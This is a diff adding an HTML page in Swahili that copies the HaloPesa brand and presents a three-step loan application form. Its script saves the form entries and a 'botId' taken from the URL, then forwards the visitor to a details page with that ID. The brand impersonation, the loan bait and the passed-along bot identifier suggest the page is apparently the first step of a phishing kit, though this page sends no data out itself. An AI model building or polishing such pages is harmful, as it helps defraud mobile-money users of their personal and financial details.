@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ombi la Mkopo - HaloPesa</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+<style>
+/* ===== HALOPESA BRAND STYLES ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+body {
+    background: #f0f4f0;
+    padding-top: 70px;
+}
+
+/* ===== HEADER - HaloPesa Green ===== */
+.header {
+    background: #1a7a2a;
+    height: 65px;
+    width: 100%;
+    position: fixed;
+    top: 0;
+    left: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    box-shadow: 0 2px 12px rgba(26, 122, 42, 0.20);
+}
+
+.back-btn {
+    position: absolute;
+    left: 20px;
+    color: #e8f5e8;
+    text-decoration: none;
+    font-size: 15px;
+    font-weight: 500;
+    transition: color 0.2s;
+}
+
+.back-btn:hover {
+    color: #ffffff;
+}
+
+.menu-btn {
+    position: absolute;
+    right: 20px;
+    color: #e8f5e8;
+    font-size: 28px;
+    font-weight: 300;
+}
+
+.logo {
+    color: #ffd700;
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+}
+
+/* ===== CONTAINER & CARD ===== */
+.container {
+    max-width: 600px;
+    margin: 0 auto 30px;
+    padding: 0 15px;
+}
+
+.card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 35px 30px;
+    box-shadow: 0 8px 30px rgba(26, 67, 41, 0.10);
+    border: 1px solid #e6efe6;
+}
+
+.title {
+    text-align: center;
+    color: #1a6b2a;
+    font-size: 24px;
+    font-weight: 700;
+}
+
+.subtitle {
+    text-align: center;
+    color: #5a6b5a;
+    margin-top: 6px;
+    font-size: 15px;
+}
+
+/* ===== PROGRESS BAR ===== */
+.progress {
+    display: flex;
+    gap: 10px;
+    margin: 22px 0 30px;
+}
+
+.step {
+    flex: 1;
+    height: 6px;
+    background: #d9e6d9;
+    border-radius: 6px;
+    transition: background 0.3s;
+}
+
+.step.active {
+    background: #1a7a2a;
+}
+
+/* ===== FORM ELEMENTS ===== */
+.form-group {
+    margin-bottom: 22px;
+}
+
+label {
+    display: block;
+    margin-bottom: 8px;
+    color: #1a2b1a;
+    font-weight: 600;
+    font-size: 14px;
+}
+
+input,
+select,
+textarea {
+    width: 100%;
+    border: 2px solid #d0e0d0;
+    border-radius: 10px;
+    padding: 14px 16px;
+    font-size: 16px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    background: #fafffa;
+    color: #1a2b1a;
+}
+
+input:focus,
+select:focus,
+textarea:focus {
+    border-color: #1a7a2a;
+    box-shadow: 0 0 0 4px rgba(26, 122, 42, 0.12);
+}
+
+input::placeholder,
+textarea::placeholder {
+    color: #a0b8a0;
+}
+
+select {
+    appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%231a7a2a' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 16px center;
+    cursor: pointer;
+}
+
+select option {
+    background: #ffffff;
+    color: #1a2b1a;
+}
+
+textarea {
+    resize: vertical;
+    min-height: 120px;
+}
+
+/* ===== BUTTON - HaloPesa Green ===== */
+.btn {
+    width: 100%;
+    background: #1a7a2a;
+    color: #ffffff;
+    border: none;
+    border-radius: 10px;
+    padding: 16px;
+    font-size: 18px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background 0.2s, transform 0.1s;
+    letter-spacing: 0.5px;
+}
+
+.btn:hover {
+    background: #136622;
+    transform: scale(1.01);
+}
+
+.btn:active {
+    transform: scale(0.98);
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 600px) {
+    .card {
+        padding: 25px 18px;
+    }
+
+    .title {
+        font-size: 21px;
+    }
+
+    .header {
+        height: 58px;
+    }
+
+    .logo {
+        font-size: 17px;
+    }
+
+    .menu-btn {
+        font-size: 24px;
+    }
+
+    .btn {
+        font-size: 16px;
+        padding: 15px;
+    }
+}
+</style>
+</head>
+<body>
+
+<!-- ===== HEADER - HaloPesa Style ===== -->
+<header class="header">
+    <a href="index.html" class="back-btn">← Back</a>
+    <div class="logo">HaloPesa</div>
+    <div class="menu-btn">☰</div>
+</header>
+
+<div class="container">
+    <div class="card">
+        <h2 class="title">Ombi la Mkopo</h2>
+        <p class="subtitle">Hatua ya 1 kati ya 3</p>
+
+        <div class="progress">
+            <div class="step active"></div>
+            <div class="step"></div>
+            <div class="step"></div>
+        </div>
+
+        <form id="loanForm">
+            <div class="form-group">
+                <label>Aina ya Mkopo</label>
+                <select required id="loanType">
+                    <option value="">Chagua aina ya mkopo</option>
+                    <option>Mkopo wa Kibinafsi</option>
+                    <option>Mkopo wa Biashara</option>
+                    <option>Mkopo wa Nyumba</option>
+                    <option>Mkopo wa Gari</option>
+                    <option>Mkopo wa Elimu</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Kiasi cha Mkopo (TZS)</label>
+                <input
+                    type="number"
+                    id="loanAmount"
+                    value="1000000"
+                    required>
+            </div>
+
+            <div class="form-group">
+                <label>Muda wa Mkopo</label>
+                <select required id="loanDuration">
+                    <option>Miezi 6</option>
+                    <option>Miezi 12</option>
+                    <option>Miezi 24</option>
+                    <option>Miezi 36</option>
+                    <option selected>Miezi 48</option>
+                    <option>Miezi 60</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Kusudi la Mkopo</label>
+                <textarea
+                    id="loanPurpose"
+                    placeholder="Elezea kusudi la mkopo wako..."
+                    required></textarea>
+            </div>
+
+            <button type="submit" class="btn">
+                HATUA INAYOFUATA
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- ===== YOUR LOGIC — COMPLETELY UNTOUCHED ===== -->
+<script>
+// Get botId from URL
+const urlParams = new URLSearchParams(window.location.search);
+const botId = urlParams.get('botId');
+console.log('Bot ID on form page:', botId);
+
+// Store botId
+if (botId) {
+    localStorage.setItem('botId', botId);
+}
+
+document.getElementById("loanForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    // Get form values
+    const loanType = document.getElementById('loanType').value;
+    const loanAmount = document.getElementById('loanAmount').value;
+    const loanDuration = document.getElementById('loanDuration').value;
+    const loanPurpose = document.getElementById('loanPurpose').value;
+
+    // Validate form
+    if (!loanType) {
+        alert('Tafadhali chagua aina ya mkopo');
+        return;
+    }
+
+    if (!loanAmount || loanAmount < 50000) {
+        alert('Tafadhali weka kiasi sahihi cha mkopo (kiasi cha chini ni TZS 50,000)');
+        return;
+    }
+
+    if (!loanPurpose || loanPurpose.length < 10) {
+        alert('Tafadhali eleza kusudi la mkopo (angalau herufi 10)');
+        return;
+    }
+
+    // Format loan amount with commas
+    const formattedAmount = parseInt(loanAmount).toLocaleString();
+
+    // Save to localStorage with ALL form data
+    localStorage.setItem('loanType', loanType);
+    localStorage.setItem('loanAmount', loanAmount);
+    localStorage.setItem('loanAmountFormatted', formattedAmount);
+    localStorage.setItem('loanDuration', loanDuration);
+    localStorage.setItem('loanPurpose', loanPurpose);
+
+    // Save timestamp for application date
+    const now = new Date();
+    const dateStr = now.toLocaleDateString('sw-TZ', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric'
+    });
+    const timeStr = now.toLocaleTimeString('sw-TZ', {
+        hour: '2-digit',
+        minute: '2-digit'
+    });
+    localStorage.setItem('applicationDate', `${dateStr} ${timeStr}`);
+    localStorage.setItem('applicationTimestamp', now.toISOString());
+
+    console.log('Loan application data saved:', {
+        loanType,
+        loanAmount,
+        formattedAmount,
+        loanDuration,
+        loanPurpose,
+        applicationDate: `${dateStr} ${timeStr}`
+    });
+
+    // Redirect to details page with botId
+    const botIdParam = botId || localStorage.getItem('botId') || '';
+    window.location.href = `details.html?botId=${botIdParam}`;
+});
+</script>
+
+</body>
+</html>
